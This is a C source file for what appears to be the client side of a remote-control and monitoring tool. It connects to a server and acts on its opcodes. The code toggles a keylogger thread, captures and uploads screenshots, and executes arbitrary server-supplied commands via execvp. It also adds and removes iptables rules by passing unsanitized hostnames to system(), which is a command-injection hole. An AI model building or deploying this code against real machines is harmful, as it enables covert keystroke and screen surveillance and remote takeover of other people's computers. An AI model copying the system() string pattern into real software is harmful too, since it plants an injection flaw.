#include <stdio.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>
#include <pwd.h>
#include <fcntl.h>
#include "clientManager.h"
#include "keylog.h"
#include "constraints.h"
#include "messageManager.h"
#include "utils.h"

extern clientInfo_t clientData;
#define MAX_SITES 20

char blocked_sites[MAX_SITES][100];
int bs_nr = 0;

char previous_blocked_sites[MAX_SITES][100];
int previous_bs_nr = 0;


void connectionInitialize(int *sock)
{
    struct sockaddr_in server;

    // Create socket
    *sock = socket(AF_INET, SOCK_STREAM, 0);
    if (*sock == -1)
    {
        printf("Could not create socket\n");
        exit(1);
    }
    printf("Socket created\n");

    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Server IP
    server.sin_family = AF_INET;
    server.sin_port = htons(8888); // Server port

    // Connect to remote server
    if (connect(*sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        perror("Connect failed. Error");
        exit(1);
    }
    printf("Connected\n");
}

void startingDataInitialize()
{
    // Trimite Date despre Utilizator--------------------
    printf("Opening file %s\n", CLIENT_CONFIG_FILE);
    int fd = open(CLIENT_CONFIG_FILE, O_RDONLY);
    if (fd < 0)
    {
        printf("Error Opening Config file.\n");
        exit(-1);
    }

    char buffer[BUFFER_SIZE];

    ssize_t bytes_read = read(fd, buffer, sizeof(buffer) - 1);
    if (bytes_read < 0)
    {
        perror("Eroare la citirea fișierului");
        close(fd);
        exit(-1);
    }
    close(fd);

    buffer[bytes_read] = '\0';
    char copyBuffer[BUFFER_SIZE];
    strcpy(copyBuffer, buffer);
    char *p = strtok(buffer, " =\n");
    while (p)
    {
        if (strcmp(p, "Nume_Echipament") == 0)
        {
            p = strtok(NULL, "= \n");
            strcpy(clientData.name, p);
        }
        if (strcmp(p, "Keyboard_Input") == 0)
        {
            p = strtok(NULL, "= \n");
            strcpy(clientData.keyLoggerInputFile, p);
        }
        p = strtok(NULL, "= \n");
    }

    message_t msg;
    encapsulateMessage(&msg, copyBuffer, 'U');

    sendMessage(clientData.serverSocket, &msg);
}

void handleKeyLoggerOpcode()
{
    if (clientData.isKeyLoggerActive && clientData.keyLoggerTid != -1)
    {
        pthread_cancel(clientData.keyLoggerTid);
        // close(clientData.keyLoggerInputFile);
        message_t msg;
        msg.opCode = 'K';
        strcpy(msg.buffer, "STOP");
        msg.size = strlen(msg.buffer);
        sendMessage(clientData.serverSocket, &msg);
        clientData.keyLoggerTid = -1;
        clientData.isKeyLoggerActive = 0;
    }
    else
    {
        clientData.isKeyLoggerActive = 1;
        if (pthread_create(&clientData.keyLoggerTid, NULL, start_keylogger, NULL) < 0)
        {
            perror("Could not create thread");
        }
        pthread_detach(clientData.keyLoggerTid);
    }
}

void handleScreenshotOpcode()
{
    message_t msg;

    strcpy(msg.buffer, "");
    msg.opCode = 'S';
    msg.size = 0;
    sendMessage(clientData.serverSocket, &msg);

    char filename[BUFFER_SIZE];
    strcpy(filename, "/tmp/screenshotTmp.jpg");

    pid_t pid = fork();

    if (pid == 0)
    {
        execlp("scrot", "scrot", filename, "--quality", "50", NULL);
        perror("execlp failed");
        exit(EXIT_FAILURE);
    }
    else if (pid > 0)
    {
        wait(NULL);
    }
    else
    {
        msg.opCode = 'E';
        strcpy(msg.buffer, "Failed to fork for Screenshot.\n");
        msg.size = strlen(msg.buffer);
        sendMessage(clientData.serverSocket, &msg);
    }
    printf("File created. sending file...\n");
    sendFile(clientData.serverSocket, filename);

    remove(filename);
}

void expandTilde(char **args)
{
    for (int i = 0; args[i] != NULL; i++)
    {
        if (args[i][0] == '~')
        {
            const char *user = getenv("SUDO_USER");
            struct passwd *pw = getpwnam(user);
            const char *home = pw->pw_dir;

            char *expanded = malloc(strlen(home) + strlen(args[i]));
            sprintf(expanded, "%s%s", home, args[i] + 1);
            args[i] = expanded;
        }
    }
}

void handleCommandOpcode(message_t msg)
{
    pid_t pid = fork();

    if (pid == 0)
    {
        int argCount = 0;
        char *temp = strdup(msg.buffer);
        char *p = strtok(temp, " ");
        while (p)
        {
            argCount++;
            p = strtok(NULL, " ");
        }
        free(temp);
        char **args = (char **)malloc((argCount + 1) * sizeof(char *));
        int i = 0;
        p = strtok(msg.buffer, " ");
        while (p)
        {
            args[i++] = p;
            p = strtok(NULL, " ");
        }
        args[i] = NULL;
        expandTilde(args);
        printf("%s %s", args[0], args[1]);
        fflush(0);
        execvp(args[0], args);
        perror("Command");
        exit(EXIT_FAILURE);
    }
    else if (pid > 0)
    {
        wait(NULL);
    }
    else
    {
        msg.opCode = 'E';
        strcpy(msg.buffer, "Failed to fork for Screenshot.\n");
        msg.size = strlen(msg.buffer);
        sendMessage(clientData.serverSocket, &msg);
    }
}

int is_blocked_site(const char *host) {
    for (int i = 0; i < bs_nr; i++) {
        if (strcmp(blocked_sites[i], host) == 0) {
            return 1; // Site is found in the blocked list
        }
    }
    return 0; // Site is not found in the blocked list
}

void unblock_site(const char *host) {
    char command[256];

    // Unblock HTTP
    snprintf(command, sizeof(command), 
             "sudo iptables -D OUTPUT -p tcp --dport 80 -d %s -j REJECT", host);
    system(command);

    // Unblock HTTPS
    snprintf(command, sizeof(command), 
             "sudo iptables -D OUTPUT -p tcp --dport 443 -d %s -j REJECT", host);
    system(command);

    printf("Unblocked connection to %s\n", host);
}

void process_packet(const char *host) {
    printf("Host accessed: %s\n", host);

    if (is_blocked_site(host)) {
        printf("Alert: Site is blocked: %s\n", host);
        char command[256];

        snprintf(command, sizeof(command), 
                 "sudo iptables -A OUTPUT -p tcp --dport 80 -d %s -j REJECT", host);
        system(command);

        snprintf(command, sizeof(command), 
                 "sudo iptables -A OUTPUT -p tcp --dport 443 -d %s -j REJECT", host);
        system(command);

        printf("Blocked connection to %s\n", host);
    }
}

void handleIpOpcode(message_t msg) {
    char *p;
    char local_buffer[SEND_BUFFER_SIZE];
    strncpy(local_buffer, msg.buffer, sizeof(local_buffer) - 1);
    local_buffer[sizeof(local_buffer) - 1] = '\0'; // Null-terminate

    p = strtok(local_buffer, " ");
    char sites[MAX_SITES][100];
    int i = 0;

    while (p && i < MAX_SITES) {
        strncpy(sites[i], p, sizeof(sites[i]) - 1);
        sites[i][sizeof(sites[i]) - 1] = '\0';
        i++;
        p = strtok(NULL, " ");
    }

    if (i >= MAX_SITES) {
        printf("Limita maxima de ip-uri blocate atinsa\n");
        return;
    }

    // Unblock sites no longer in the current list
    for (int j = 0; j < previous_bs_nr; j++) {
        int found = 0;
        for (int k = 0; k < i; k++) {
            if (strcmp(previous_blocked_sites[j], sites[k]) == 0) {
                found = 1;
                break;
            }
        }
        if (!found) {
            unblock_site(previous_blocked_sites[j]);
        }
    }

    // Copy new list to blocked_sites and update size
    bs_nr = i;
    for (int j = 0; j < bs_nr; j++) {
        strncpy(blocked_sites[j], sites[j], sizeof(blocked_sites[j]) - 1);
        blocked_sites[j][sizeof(blocked_sites[j]) - 1] = '\0';
    }

    // Update previous blocklist
    previous_bs_nr = bs_nr;
    for (int j = 0; j < previous_bs_nr; j++) {
        strncpy(previous_blocked_sites[j], blocked_sites[j], sizeof(previous_blocked_sites[j]) - 1);
        previous_blocked_sites[j][sizeof(previous_blocked_sites[j]) - 1] = '\0';
    }

    // Block sites in the current list
    for (int j = 0; j < bs_nr; j++) {
        process_packet(blocked_sites[j]);
    }
}


void handleOpcode(message_t msg)
{
    switch (msg.opCode)
    {
    case 'K':
        handleKeyLoggerOpcode();
        break;
    case 'S':
        handleScreenshotOpcode();
        break;
    case 'C': ///////De adaugat si in Obsidian
        handleCommandOpcode(msg);
        break;
    case 'B':
        handleIpOpcode(msg);
        break;
    }
}